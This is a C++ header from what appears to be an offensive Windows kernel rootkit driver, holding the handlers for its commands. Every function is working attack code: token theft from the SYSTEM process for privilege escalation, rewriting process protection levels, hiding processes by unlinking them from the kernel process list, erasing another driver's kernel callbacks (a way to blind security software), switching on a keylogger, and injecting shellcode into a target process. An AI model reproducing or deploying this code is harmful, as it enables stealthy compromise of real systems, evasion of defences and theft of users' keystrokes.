#pragma once

#include <ntifs.h>
#include <wdf.h>

#include "Globals.hpp"
#include "ProcessUtils.hpp"
#include "DriverMeta.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"
#include "AddressUtils.hpp"
#include "Vector.hpp"
#include "CallbackUtils.hpp"
#include "AutoLock.hpp"

// --------------------------------------------------------------------------------------------------------

NTSTATUS BeCmd_KillProcess(_In_ HANDLE Pid);
NTSTATUS BeCmd_ProtectProcess(_In_ ULONG Pid, _In_ BYTE NewProcessProtection);
NTSTATUS BeCmd_ElevateProcessAcessToken(_In_ HANDLE Pid);
NTSTATUS BeCmd_KillProcess(_In_ HANDLE Pid);
NTSTATUS BeCmd_HideProcess(_In_ HANDLE Pid);
ktd::vector<CALLBACK_DATA, PagedPool> BeCmd_EnumerateCallbacks(_In_ CALLBACK_TYPE CallbackType);
NTSTATUS BeCmd_EraseCallbacks(_In_ PWCHAR TargetDriver, _In_ CALLBACK_TYPE CbType);
NTSTATUS BeCmd_StartKeylogger(_In_ BOOLEAN Start);
NTSTATUS BeCmd_InjectionShellcode(_In_ ULONG Pid, _In_ PCWSTR FilePath);

// --------------------------------------------------------------------------------------------------------

/*
 * @brief Sets the protection of an arbitrary process by PID.
 *
 * @param[in] Pid PID of the target process.
 * @param[in] NewProtectionLevel New level of protection to apply.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_ProtectProcess(_In_ ULONG Pid, _In_ BYTE NewProtectionLevel)
{
    LOG_MSG("Changing pid %i protection to %i\r\n", Pid, NewProtectionLevel);
    
    //
    // Lookup process
    //
    PEPROCESS Process = BeGetEprocessByPid(Pid);
    if (Process == NULL)
        return STATUS_INVALID_PARAMETER_1;

    ULONG_PTR EProtectionLevel = (ULONG_PTR)Process + BeGetEprocessProcessProtectionOffset();

    LOG_MSG("Current protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));

    //
    // Assign new protection level
    //
    *((BYTE*)(EProtectionLevel)) = NewProtectionLevel;

    LOG_MSG("New protection level: %i\r\n", *((BYTE*)(EProtectionLevel)));

    ObDereferenceObject(Process);
    return STATUS_SUCCESS;
}

/*
 * @brief Sets the target process access token to a SYSTEM token.
 *
 * @param[in] Pid PID of the target process.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_ElevateProcessAcessToken(_In_ HANDLE Pid)
{
    PEPROCESS PrivilegedProcess = NULL; 
    PEPROCESS TargetProcess     = NULL;
    NTSTATUS  Status            = STATUS_UNSUCCESSFUL;
    ULONG     TokenOffset       = BeGetAccessTokenOffset();

    //
    // Lookup target process
    //
    Status = PsLookupProcessByProcessId(Pid, &TargetProcess);
    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("PID %i not found\r\n", HandleToUlong(Pid));
        ObDereferenceObject(TargetProcess);
        return Status;
    }

    //
    // Lookup system process (handle for pid 4)
    //
    Status = PsLookupProcessByProcessId((HANDLE)4, &PrivilegedProcess);
    if (!NT_SUCCESS(Status))
    {
        LOG_MSG("System process not found with pid 4\r\n");
        ObDereferenceObject(PrivilegedProcess);
        ObDereferenceObject(TargetProcess);
        return Status;
    }

    LOG_MSG("Token Target: %i", (ULONG)TargetProcess + TokenOffset);
    LOG_MSG("Token System: %i", (ULONG)PrivilegedProcess + TokenOffset);

    //
    // Replace target process token with system token
    //
    *(ULONG64*)((ULONG64)TargetProcess + TokenOffset) = *(ULONG64*)((ULONG64)PrivilegedProcess + TokenOffset);

    ObDereferenceObject(PrivilegedProcess);
    ObDereferenceObject(TargetProcess);
    return Status;
}

/*
 * @brief Kills a process by PID.
 *
 * @param[in] Pid PID of the process to kill.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_KillProcess(_In_ HANDLE Pid)
{
    HANDLE            HProcess = NULL;
    CLIENT_ID         Ci       = { 0 };
    OBJECT_ATTRIBUTES Obj      = { 0 };

    PEPROCESS Prc = BeGetEprocessByPid(HandleToULong(Pid));
    if (Prc == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }

    ObDereferenceObject(Prc);

    Ci.UniqueProcess = Pid;
    Obj.Length = sizeof(Obj);

    BeGlobals::pZwOpenProcess(&HProcess, 1, &Obj, &Ci);
    NTSTATUS Status = BeGlobals::pZwTerminateProcess(HProcess, 0);
    BeGlobals::pZwClose(HProcess);

    LOG_MSG("KillProcess %i \r\n", Status);
    return Status;
}

/*
 * @brief Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
 *
 * @param[in] Pid PID of the target process.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_HideProcess(_In_ HANDLE Pid)
{
    PEPROCESS TargetProcess = BeGetEprocessByPid(HandleToULong(Pid));
    if (TargetProcess == NULL)
        return STATUS_INVALID_PARAMETER;

    {
        AutoLock<FastMutex> _lock(BeGlobals::ProcessListLock);
        PLIST_ENTRY ProcessListEntry = (PLIST_ENTRY)((ULONG_PTR)TargetProcess + BeGetProcessLinkedListOffset());
        RemoveEntryList(ProcessListEntry);
    }
    
    ObDereferenceObject(TargetProcess);
    return STATUS_SUCCESS;
}

/*
 * @brief Enumerates kernel callbacks.
 *
 * @param[in] Type Type of callback to resolve.
 *
 * @returns ktd::vector<CALLBACK_DATA, PagedPool> Vector of callbacks.
 */
ktd::vector<CALLBACK_DATA, PagedPool>
BeCmd_EnumerateCallbacks(_In_ CALLBACK_TYPE type)
{
    return BeEnumerateKernelCallbacks(type);
}

/*
 * @brief Replaces all kernel callbacks of a specified driver with empty callbacks.
 *
 * @param[in] TargetDriver Name of the target driver.
 * @param[in] CbType Type of callback to remove.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_EraseCallbacks(_In_ PWCHAR TargetDriver, _In_ CALLBACK_TYPE CbType)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    Status = BeReplaceKernelCallbacksOfDriver(TargetDriver, CbType);
    return Status;
}

/*
 * @brief Starts or stops the keylogger.
 *
 * @param[in] Start TRUE to start, FALSE to stop.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_StartKeylogger(_In_ BOOLEAN Start)
{
    BeGlobals::LogKeys = Start;
    LOG_MSG("Log keys: %d\n", Start);

    return STATUS_SUCCESS;
}

/*
 * @brief Injects shellcode via ZwCreateThreadEx.
 *
 * @param[in] Pid The process ID of the target process.
 * @param[in] FilePath A pointer to a null-terminated wide string containing the path to the shellcode file.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_InjectionShellcode(
    _In_ ULONG  Pid,
    _In_ PCWSTR FilePath
) {
    return BeInjectionShellcode(Pid, FilePath);
}